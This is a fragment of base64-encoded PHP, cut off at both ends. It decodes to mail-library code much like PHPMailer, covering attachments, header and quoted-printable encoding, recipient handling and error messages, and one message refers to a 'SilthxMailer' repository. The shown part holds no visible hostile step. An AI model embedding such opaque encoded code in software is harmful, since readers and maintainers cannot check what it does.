ZhbHNlKTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICBpbmlfc2V0KCdtYWdpY19xdW90ZXNfcnVudGltZScsIGZhbHNlKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkZmlsZV9idWZmZXIgPSBAZmlsZV9nZXRfY29udGVudHMoJHBhdGgpOw0KICAgICAgICAgICAgJGZpbGVfYnVmZmVyID0gJHRoaXMtPmVuY29kZVN0cmluZygkZmlsZV9idWZmZXIsICRlbmNvZGluZyk7DQogICAgICAgICAgICBpZiAoJG1hZ2ljX3F1b3Rlcykgew0KICAgICAgICAgICAgICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc1LjMuMCcsICc8JykpIHsNCiAgICAgICAgICAgICAgICAgICAgc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKCRtYWdpY19xdW90ZXMpOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIGluaV9zZXQoJ21hZ2ljX3F1b3Rlc19ydW50aW1lJywgJG1hZ2ljX3F1b3Rlcyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuICRmaWxlX2J1ZmZlcjsNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCAoRXhjZXB0aW9uICRleGMpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOw0KICAgICAgICAgICAgcmV0dXJuICcnOw0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVTdHJpbmcoJHN0ciwgJGVuY29kaW5nID0gJ2Jhc2U2NCcpIHsNCiAgICAgICAgJGVuY29kZWQgPSAnJzsNCiAgICAgICAgc3dpdGNoIChzdHJ0b2xvd2VyKCRlbmNvZGluZykpIHsNCiAgICAgICAgICAgIGNhc2UgJ2Jhc2U2NCc6DQogICAgICAgICAgICAgICAgJGVuY29kZWQgPSBjaHVua19zcGxpdChiYXNlNjRfZW5jb2RlKCRzdHIpLCA3NiwgJHRoaXMtPkxFKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJzdiaXQnOg0KICAgICAgICAgICAgY2FzZSAnOGJpdCc6DQogICAgICAgICAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+Zml4RU9MKCRzdHIpOw0KICAgICAgICAgICAgICAgIGlmIChzdWJzdHIoJGVuY29kZWQsIC0oc3RybGVuKCR0aGlzLT5MRSkpKSAhPSAkdGhpcy0+TEUpIHsNCiAgICAgICAgICAgICAgICAgICAgJGVuY29kZWQgLj0gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2JpbmFyeSc6DQogICAgICAgICAgICAgICAgJGVuY29kZWQgPSAkc3RyOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAncXVvdGVkLXByaW50YWJsZSc6DQogICAgICAgICAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+ZW5jb2RlUVAoJHN0cik7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkdGhpcy0+bGFuZygnZW5jb2RpbmcnKSAuICRlbmNvZGluZyk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRlbmNvZGVkOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZW5jb2RlSGVhZGVyKCRzdHIsICRwb3NpdGlvbiA9ICd0ZXh0Jykgew0KICAgICAgICAkbWF0Y2hjb3VudCA9IDA7DQogICAgICAgIHN3aXRjaCAoc3RydG9sb3dlcigkcG9zaXRpb24pKSB7DQogICAgICAgICAgICBjYXNlICdwaHJhc2UnOg0KICAgICAgICAgICAgICAgIGlmICghcHJlZ19tYXRjaCgnL1tcMjAwLVwzNzddLycsICRzdHIpKSB7DQogICAgICAgICAgICAgICAgICAgICRlbmNvZGVkID0gYWRkY3NsYXNoZXMoJHN0ciwgIlwwLi5cMzdcMTc3XFxcIiIpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoKCRzdHIgPT0gJGVuY29kZWQpICYmICFwcmVnX21hdGNoKCcvW15BLVphLXowLTkhIyQlJlwnKitcLz0/Xl9ge3x9fiAtXS8nLCAkc3RyKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgkZW5jb2RlZCk7DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKCJcIiRlbmNvZGVkXCIiKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkbWF0Y2hjb3VudCA9IHByZWdfbWF0Y2hfYWxsKCcvW15cMDQwXDA0MVwwNDMtXDEzM1wxMzUtXDE3Nl0vJywgJHN0ciwgJG1hdGNoZXMpOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnY29tbWVudCc6DQogICAgICAgICAgICAgICAgJG1hdGNoY291bnQgPSBwcmVnX21hdGNoX2FsbCgnL1soKSJdLycsICRzdHIsICRtYXRjaGVzKTsNCiAgICAgICAgICAgIGNhc2UgJ3RleHQnOg0KICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAkbWF0Y2hjb3VudCArPSBwcmVnX21hdGNoX2FsbCgnL1tcMDAwLVwwMTBcMDEzXDAxNFwwMTYtXDAzN1wxNzctXDM3N10vJywgJHN0ciwgJG1hdGNoZXMpOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQogICAgICAgIGlmICgkbWF0Y2hjb3VudCA9PSAwKSB7DQogICAgICAgICAgICByZXR1cm4gKCRzdHIpOw0KICAgICAgICB9DQogICAgICAgICRtYXhsZW4gPSA3NSAtIDcgLSBzdHJsZW4oJHRoaXMtPkNoYXJTZXQpOw0KICAgICAgICBpZiAoJG1hdGNoY291bnQgPiBzdHJsZW4oJHN0cikgLyAzKSB7DQogICAgICAgICAgICAkZW5jb2RpbmcgPSAnQic7DQogICAgICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdtYl9zdHJsZW4nKSAmJiAkdGhpcy0+aGFzTXVsdGlCeXRlcygkc3RyKSkgew0KICAgICAgICAgICAgICAgICRlbmNvZGVkID0gJHRoaXMtPmJhc2U2NEVuY29kZVdyYXBNQigkc3RyLCAiXG4iKTsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJGVuY29kZWQgPSBiYXNlNjRfZW5jb2RlKCRzdHIpOw0KICAgICAgICAgICAgICAgICRtYXhsZW4gLT0gJG1heGxlbiAlIDQ7DQogICAgICAgICAgICAgICAgJGVuY29kZWQgPSB0cmltKGNodW5rX3NwbGl0KCRlbmNvZGVkLCAkbWF4bGVuLCAiXG4iKSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkZW5jb2RpbmcgPSAnUSc7DQogICAgICAgICAgICAkZW5jb2RlZCAgPSAkdGhpcy0+ZW5jb2RlUSgkc3RyLCAkcG9zaXRpb24pOw0KICAgICAgICAgICAgJGVuY29kZWQgID0gJHRoaXMtPndyYXBUZXh0KCRlbmNvZGVkLCAkbWF4bGVuLCB0cnVlKTsNCiAgICAgICAgICAgICRlbmNvZGVkICA9IHN0cl9yZXBsYWNlKCc9JyAuIHNlbGY6OkNSTEYsICJcbiIsIHRyaW0oJGVuY29kZWQpKTsNCiAgICAgICAgfQ0KICAgICAgICAkZW5jb2RlZCA9IHByZWdfcmVwbGFjZSgnL14oLiopJC9tJywgJyA9PycgLiAkdGhpcy0+Q2hhclNldCAuICI/JGVuY29kaW5nP1xcMT89IiwgJGVuY29kZWQpOw0KICAgICAgICAkZW5jb2RlZCA9IHRyaW0oc3RyX3JlcGxhY2UoIlxuIiwgJHRoaXMtPkxFLCAkZW5jb2RlZCkpOw0KICAgICAgICByZXR1cm4gJGVuY29kZWQ7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBoYXNNdWx0aUJ5dGVzKCRzdHIpIHsNCiAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnbWJfc3RybGVuJykpIHsNCiAgICAgICAgICAgIHJldHVybiAoc3RybGVuKCRzdHIpID4gbWJfc3RybGVuKCRzdHIsICR0aGlzLT5DaGFyU2V0KSk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGhhczhiaXRDaGFycygkdGV4dCkgew0KICAgICAgICByZXR1cm4gKGJvb2xlYW4pIHByZWdfbWF0Y2goJy9bXHg4MC1ceEZGXS8nLCAkdGV4dCk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBiYXNlNjRFbmNvZGVXcmFwTUIoJHN0ciwgJGxpbmVicmVhayA9IG51bGwpIHsNCiAgICAgICAgJHN0YXJ0ICAgPSAnPT8nIC4gJHRoaXMtPkNoYXJTZXQgLiAnP0I/JzsNCiAgICAgICAgJGVuZCAgICAgPSAnPz0nOw0KICAgICAgICAkZW5jb2RlZCA9ICcnOw0KICAgICAgICBpZiAoJGxpbmVicmVhayA9PT0gbnVsbCkgew0KICAgICAgICAgICAgJGxpbmVicmVhayA9ICR0aGlzLT5MRTsNCiAgICAgICAgfQ0KICAgICAgICAkbWJfbGVuZ3RoID0gbWJfc3RybGVuKCRzdHIsICR0aGlzLT5DaGFyU2V0KTsNCiAgICAgICAgJGxlbmd0aCAgICA9IDc1IC0gc3RybGVuKCRzdGFydCkgLSBzdHJsZW4oJGVuZCk7DQogICAgICAgICRyYXRpbyAgICAgPSAkbWJfbGVuZ3RoIC8gc3RybGVuKCRzdHIpOw0KICAgICAgICAkYXZnTGVuZ3RoID0gZmxvb3IoJGxlbmd0aCAqICRyYXRpbyAqIC43NSk7DQogICAgICAgIGZvciAoJGkgPSAwOyAkaSA8ICRtYl9sZW5ndGg7ICRpICs9ICRvZmZzZXQpIHsNCiAgICAgICAgICAgICRsb29rQmFjayA9IDA7DQogICAgICAgICAgICBkbyB7DQogICAgICAgICAgICAgICAgJG9mZnNldCA9ICRhdmdMZW5ndGggLSAkbG9va0JhY2s7DQogICAgICAgICAgICAgICAgJGNodW5rICA9IG1iX3N1YnN0cigkc3RyLCAkaSwgJG9mZnNldCwgJHRoaXMtPkNoYXJTZXQpOw0KICAgICAgICAgICAgICAgICRjaHVuayAgPSBiYXNlNjRfZW5jb2RlKCRjaHVuayk7DQogICAgICAgICAgICAgICAgJGxvb2tCYWNrKys7DQogICAgICAgICAgICB9IHdoaWxlIChzdHJsZW4oJGNodW5rKSA+ICRsZW5ndGgpOw0KICAgICAgICAgICAgJGVuY29kZWQgLj0gJGNodW5rIC4gJGxpbmVicmVhazsNCiAgICAgICAgfQ0KICAgICAgICAkZW5jb2RlZCA9IHN1YnN0cigkZW5jb2RlZCwgMCwgLXN0cmxlbigkbGluZWJyZWFrKSk7DQogICAgICAgIHJldHVybiAkZW5jb2RlZDsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGVuY29kZVFQKCRzdHJpbmcsICRsaW5lX21heCA9IDc2KSB7DQogICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ3F1b3RlZF9wcmludGFibGVfZW5jb2RlJykpIHsNCiAgICAgICAgICAgIHJldHVybiBxdW90ZWRfcHJpbnRhYmxlX2VuY29kZSgkc3RyaW5nKTsNCiAgICAgICAgfQ0KICAgICAgICAkc3RyaW5nID0gc3RyX3JlcGxhY2UoYXJyYXkoDQogICAgICAgICAgICAnJTIwJywNCiAgICAgICAgICAgICclMEQlMEEuJywNCiAgICAgICAgICAgICclMEQlMEEnLA0KICAgICAgICAgICAgJyUnDQogICAgICAgICksIGFycmF5KA0KICAgICAgICAgICAgJyAnLA0KICAgICAgICAgICAgIlxyXG49MkUiLA0KICAgICAgICAgICAgIlxyXG4iLA0KICAgICAgICAgICAgJz0nDQogICAgICAgICksIHJhd3VybGVuY29kZSgkc3RyaW5nKSk7DQogICAgICAgIHJldHVybiBwcmVnX3JlcGxhY2UoJy9bXlxyXG5deycgLiAoJGxpbmVfbWF4IC0gMykgLiAnfVtePVxyXG5dezJ9LycsICIkMD1cclxuIiwgJHN0cmluZyk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVRUHBocCgkc3RyaW5nLCAkbGluZV9tYXggPSA3NiwgJHNwYWNlX2NvbnYgPSBmYWxzZSkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmVuY29kZVFQKCRzdHJpbmcsICRsaW5lX21heCk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVRKCRzdHIsICRwb3NpdGlvbiA9ICd0ZXh0Jykgew0KICAgICAgICAkcGF0dGVybiA9ICcnOw0KICAgICAgICAkZW5jb2RlZCA9IHN0cl9yZXBsYWNlKGFycmF5KA0KICAgICAgICAgICAgIlxyIiwNCiAgICAgICAgICAgICJcbiINCiAgICAgICAgKSwgJycsICRzdHIpOw0KICAgICAgICBzd2l0Y2ggKHN0cnRvbG93ZXIoJHBvc2l0aW9uKSkgew0KICAgICAgICAgICAgY2FzZSAncGhyYXNlJzoNCiAgICAgICAgICAgICAgICAkcGF0dGVybiA9ICdeQS1aYS16MC05ISorXC8gLSc7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdjb21tZW50JzoNCiAgICAgICAgICAgICAgICAkcGF0dGVybiA9ICdcKFwpIic7DQogICAgICAgICAgICBjYXNlICd0ZXh0JzoNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgJHBhdHRlcm4gPSAnXDAwMC1cMDExXDAxM1wwMTRcMDE2LVwwMzdcMDc1XDA3N1wxMzdcMTc3LVwzNzcnIC4gJHBhdHRlcm47DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIH0NCiAgICAgICAgJG1hdGNoZXMgPSBhcnJheSgpOw0KICAgICAgICBpZiAocHJlZ19tYXRjaF9hbGwoIi9beyRwYXR0ZXJufV0vIiwgJGVuY29kZWQsICRtYXRjaGVzKSkgew0KICAgICAgICAgICAgJGVxa2V5ID0gYXJyYXlfc2VhcmNoKCc9JywgJG1hdGNoZXNbMF0pOw0KICAgICAgICAgICAgaWYgKGZhbHNlICE9PSAkZXFrZXkpIHsNCiAgICAgICAgICAgICAgICB1bnNldCgkbWF0Y2hlc1swXVskZXFrZXldKTsNCiAgICAgICAgICAgICAgICBhcnJheV91bnNoaWZ0KCRtYXRjaGVzWzBdLCAnPScpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZm9yZWFjaCAoYXJyYXlfdW5pcXVlKCRtYXRjaGVzWzBdKSBhcyAkY2hhcikgew0KICAgICAgICAgICAgICAgICRlbmNvZGVkID0gc3RyX3JlcGxhY2UoJGNoYXIsICc9JyAuIHNwcmludGYoJyUwMlgnLCBvcmQoJGNoYXIpKSwgJGVuY29kZWQpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiBzdHJfcmVwbGFjZSgnICcsICdfJywgJGVuY29kZWQpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkU3RyaW5nQXR0YWNobWVudCgkc3RyaW5nLCAkZmlsZW5hbWUsICRlbmNvZGluZyA9ICdiYXNlNjQnLCAkdHlwZSA9ICcnLCAkZGlzcG9zaXRpb24gPSAnYXR0YWNobWVudCcpIHsNCiAgICAgICAgaWYgKCR0eXBlID09ICcnKSB7DQogICAgICAgICAgICAkdHlwZSA9IHNlbGY6OmZpbGVuYW1lVG9UeXBlKCRmaWxlbmFtZSk7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPmF0dGFjaG1lbnRbXSA9IGFycmF5KA0KICAgICAgICAgICAgMCA9PiAkc3RyaW5nLA0KICAgICAgICAgICAgMSA9PiAkZmlsZW5hbWUsDQogICAgICAgICAgICAyID0+IGJhc2VuYW1lKCRmaWxlbmFtZSksDQogICAgICAgICAgICAzID0+ICRlbmNvZGluZywNCiAgICAgICAgICAgIDQgPT4gJHR5cGUsDQogICAgICAgICAgICA1ID0+IHRydWUsDQogICAgICAgICAgICA2ID0+ICRkaXNwb3NpdGlvbiwNCiAgICAgICAgICAgIDcgPT4gMA0KICAgICAgICApOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkRW1iZWRkZWRJbWFnZSgkcGF0aCwgJGNpZCwgJG5hbWUgPSAnJywgJGVuY29kaW5nID0gJ2Jhc2U2NCcsICR0eXBlID0gJycsICRkaXNwb3NpdGlvbiA9ICdpbmxpbmUnKSB7DQogICAgICAgIGlmICghQGlzX2ZpbGUoJHBhdGgpKSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJHRoaXMtPmxhbmcoJ2ZpbGVfYWNjZXNzJykgLiAkcGF0aCk7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCR0eXBlID09ICcnKSB7DQogICAgICAgICAgICAkdHlwZSA9IHNlbGY6OmZpbGVuYW1lVG9UeXBlKCRwYXRoKTsNCiAgICAgICAgfQ0KICAgICAgICAkZmlsZW5hbWUgPSBiYXNlbmFtZSgkcGF0aCk7DQogICAgICAgIGlmICgkbmFtZSA9PSAnJykgew0KICAgICAgICAgICAgJG5hbWUgPSAkZmlsZW5hbWU7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPmF0dGFjaG1lbnRbXSA9IGFycmF5KA0KICAgICAgICAgICAgMCA9PiAkcGF0aCwNCiAgICAgICAgICAgIDEgPT4gJGZpbGVuYW1lLA0KICAgICAgICAgICAgMiA9PiAkbmFtZSwNCiAgICAgICAgICAgIDMgPT4gJGVuY29kaW5nLA0KICAgICAgICAgICAgNCA9PiAkdHlwZSwNCiAgICAgICAgICAgIDUgPT4gZmFsc2UsDQogICAgICAgICAgICA2ID0+ICRkaXNwb3NpdGlvbiwNCiAgICAgICAgICAgIDcgPT4gJGNpZA0KICAgICAgICApOw0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGFkZFN0cmluZ0VtYmVkZGVkSW1hZ2UoJHN0cmluZywgJGNpZCwgJG5hbWUgPSAnJywgJGVuY29kaW5nID0gJ2Jhc2U2NCcsICR0eXBlID0gJycsICRkaXNwb3NpdGlvbiA9ICdpbmxpbmUnKSB7DQogICAgICAgIGlmICgkdHlwZSA9PSAnJyBhbmQgIWVtcHR5KCRuYW1lKSkgew0KICAgICAgICAgICAgJHR5cGUgPSBzZWxmOjpmaWxlbmFtZVRvVHlwZSgkbmFtZSk7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPmF0dGFjaG1lbnRbXSA9IGFycmF5KA0KICAgICAgICAgICAgMCA9PiAkc3RyaW5nLA0KICAgICAgICAgICAgMSA9PiAkbmFtZSwNCiAgICAgICAgICAgIDIgPT4gJG5hbWUsDQogICAgICAgICAgICAzID0+ICRlbmNvZGluZywNCiAgICAgICAgICAgIDQgPT4gJHR5cGUsDQogICAgICAgICAgICA1ID0+IHRydWUsDQogICAgICAgICAgICA2ID0+ICRkaXNwb3NpdGlvbiwNCiAgICAgICAgICAgIDcgPT4gJGNpZA0KICAgICAgICApOw0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGlubGluZUltYWdlRXhpc3RzKCkgew0KICAgICAgICBmb3JlYWNoICgkdGhpcy0+YXR0YWNobWVudCBhcyAkYXR0YWNobWVudCkgew0KICAgICAgICAgICAgaWYgKCRhdHRhY2htZW50WzZdID09ICdpbmxpbmUnKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gYXR0YWNobWVudEV4aXN0cygpIHsNCiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPmF0dGFjaG1lbnQgYXMgJGF0dGFjaG1lbnQpIHsNCiAgICAgICAgICAgIGlmICgkYXR0YWNobWVudFs2XSA9PSAnYXR0YWNobWVudCcpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBhbHRlcm5hdGl2ZUV4aXN0cygpIHsNCiAgICAgICAgcmV0dXJuICFlbXB0eSgkdGhpcy0+QWx0Qm9keSk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhclF1ZXVlZEFkZHJlc3Nlcygka2luZCkgew0KICAgICAgICAkUmVjaXBpZW50c1F1ZXVlID0gJHRoaXMtPlJlY2lwaWVudHNRdWV1ZTsNCiAgICAgICAgZm9yZWFjaCAoJFJlY2lwaWVudHNRdWV1ZSBhcyAkYWRkcmVzcyA9PiAkcGFyYW1zKSB7DQogICAgICAgICAgICBpZiAoJHBhcmFtc1swXSA9PSAka2luZCkgew0KICAgICAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5SZWNpcGllbnRzUXVldWVbJGFkZHJlc3NdKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJBZGRyZXNzZXMoKSB7DQogICAgICAgIGZvcmVhY2ggKCR0aGlzLT50byBhcyAkdG8pIHsNCiAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5hbGxfcmVjaXBpZW50c1tzdHJ0b2xvd2VyKCR0b1swXSldKTsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+dG8gPSBhcnJheSgpOw0KICAgICAgICAkdGhpcy0+Y2xlYXJRdWV1ZWRBZGRyZXNzZXMoJ3RvJyk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhckNDcygpIHsNCiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPmNjIGFzICRjYykgew0KICAgICAgICAgICAgdW5zZXQoJHRoaXMtPmFsbF9yZWNpcGllbnRzW3N0cnRvbG93ZXIoJGNjWzBdKV0pOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5jYyA9IGFycmF5KCk7DQogICAgICAgICR0aGlzLT5jbGVhclF1ZXVlZEFkZHJlc3NlcygnY2MnKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQkNDcygpIHsNCiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPmJjYyBhcyAkYmNjKSB7DQogICAgICAgICAgICB1bnNldCgkdGhpcy0+YWxsX3JlY2lwaWVudHNbc3RydG9sb3dlcigkYmNjWzBdKV0pOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5iY2MgPSBhcnJheSgpOw0KICAgICAgICAkdGhpcy0+Y2xlYXJRdWV1ZWRBZGRyZXNzZXMoJ2JjYycpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJSZXBseVRvcygpIHsNCiAgICAgICAgJHRoaXMtPlJlcGx5VG8gICAgICA9IGFycmF5KCk7DQogICAgICAgICR0aGlzLT5SZXBseVRvUXVldWUgPSBhcnJheSgpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJBbGxSZWNpcGllbnRzKCkgew0KICAgICAgICAkdGhpcy0+dG8gICAgICAgICAgICAgID0gYXJyYXkoKTsNCiAgICAgICAgJHRoaXMtPmNjICAgICAgICAgICAgICA9IGFycmF5KCk7DQogICAgICAgICR0aGlzLT5iY2MgICAgICAgICAgICAgPSBhcnJheSgpOw0KICAgICAgICAkdGhpcy0+YWxsX3JlY2lwaWVudHMgID0gYXJyYXkoKTsNCiAgICAgICAgJHRoaXMtPlJlY2lwaWVudHNRdWV1ZSA9IGFycmF5KCk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhckF0dGFjaG1lbnRzKCkgew0KICAgICAgICAkdGhpcy0+YXR0YWNobWVudCA9IGFycmF5KCk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhckN1c3RvbUhlYWRlcnMoKSB7DQogICAgICAgICR0aGlzLT5DdXN0b21IZWFkZXIgPSBhcnJheSgpOw0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2V0RXJyb3IoJG1zZykgew0KICAgICAgICAkdGhpcy0+ZXJyb3JfY291bnQrKzsNCiAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgPT0gJ3NtdHAnIGFuZCAhaXNfbnVsbCgkdGhpcy0+c210cCkpIHsNCiAgICAgICAgICAgICRsYXN0ZXJyb3IgPSAkdGhpcy0+c210cC0+Z2V0RXJyb3IoKTsNCiAgICAgICAgICAgIGlmICghZW1wdHkoJGxhc3RlcnJvclsnZXJyb3InXSkpIHsNCiAgICAgICAgICAgICAgICAkbXNnIC49ICR0aGlzLT5sYW5nKCdzbXRwX2Vycm9yJykgLiAkbGFzdGVycm9yWydlcnJvciddOw0KICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGxhc3RlcnJvclsnZGV0YWlsJ10pKSB7DQogICAgICAgICAgICAgICAgICAgICRtc2cgLj0gJyBEZXRhaWw6ICcgLiAkbGFzdGVycm9yWydkZXRhaWwnXTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkbGFzdGVycm9yWydzbXRwX2NvZGUnXSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJG1zZyAuPSAnIFNNVFAgY29kZTogJyAuICRsYXN0ZXJyb3JbJ3NtdHBfY29kZSddOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRsYXN0ZXJyb3JbJ3NtdHBfY29kZV9leCddKSkgew0KICAgICAgICAgICAgICAgICAgICAkbXNnIC49ICcgQWRkaXRpb25hbCBTTVRQIGluZm86ICcgLiAkbGFzdGVycm9yWydzbXRwX2NvZGVfZXgnXTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPkVycm9ySW5mbyA9ICRtc2c7DQogICAgfQ0KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gcmZjRGF0ZSgpIHsNCiAgICAgICAgZGF0ZV9kZWZhdWx0X3RpbWV6b25lX3NldChAZGF0ZV9kZWZhdWx0X3RpbWV6b25lX2dldCgpKTsNCiAgICAgICAgcmV0dXJuIGRhdGUoJ0QsIGogTSBZIEg6aTpzIE8nKTsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNlcnZlckhvc3RuYW1lKCkgew0KICAgICAgICAkcmVzdWx0ID0gJ2xvY2FsaG9zdC5sb2NhbGRvbWFpbic7DQogICAgICAgIGlmICghZW1wdHkoJHRoaXMtPkhvc3RuYW1lKSkgew0KICAgICAgICAgICAgJHJlc3VsdCA9ICR0aGlzLT5Ib3N0bmFtZTsNCiAgICAgICAgfSBlbHNlaWYgKGlzc2V0KCRfU0VSVkVSKSBhbmQgYXJyYXlfa2V5X2V4aXN0cygnU0VSVkVSX05BTUUnLCAkX1NFUlZFUikgYW5kICFlbXB0eSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkpIHsNCiAgICAgICAgICAgICRyZXN1bHQgPSAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXTsNCiAgICAgICAgfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnZ2V0aG9zdG5hbWUnKSAmJiBnZXRob3N0bmFtZSgpICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgJHJlc3VsdCA9IGdldGhvc3RuYW1lKCk7DQogICAgICAgIH0gZWxzZWlmIChwaHBfdW5hbWUoJ24nKSAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgICRyZXN1bHQgPSBwaHBfdW5hbWUoJ24nKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJHJlc3VsdDsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGxhbmcoJGtleSkgew0KICAgICAgICBpZiAoY291bnQoJHRoaXMtPmxhbmd1YWdlKSA8IDEpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRMYW5ndWFnZSgnZW4nKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygka2V5LCAkdGhpcy0+bGFuZ3VhZ2UpKSB7DQogICAgICAgICAgICBpZiAoJGtleSA9PSAnc210cF9jb25uZWN0X2ZhaWxlZCcpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPmxhbmd1YWdlWyRrZXldIC4gJyBodHRwczovL2dpdGh1Yi5jb20vU2lsdGh4TWFpbGVyL1NpbHRoe